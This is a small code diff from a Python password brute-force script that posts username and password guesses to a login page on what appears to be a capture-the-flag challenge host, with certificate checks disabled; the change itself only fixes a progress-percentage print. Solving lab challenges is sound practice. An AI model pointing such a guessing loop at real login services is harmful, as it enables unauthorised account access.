@@ -45,7 +45,7 @@ def brute():
         print('[*] Attempting for username: {username}'.format(username=username))
         for i, password in enumerate(passwords):
             if i> 0 and i%1000 == 0:
-                print("{p} %".format(i/len(passwords*100)), end='\r')
+                print("{p} %".format(p=i/len(passwords)*100), end='\r')
             params = {'username': username, 'password': password}
             resp = requests.post('https://000990aa23-web-guessmypwd.dbhchallenge.net/login.php', data=params, verify=False)
             if not resp.status_code == 401:
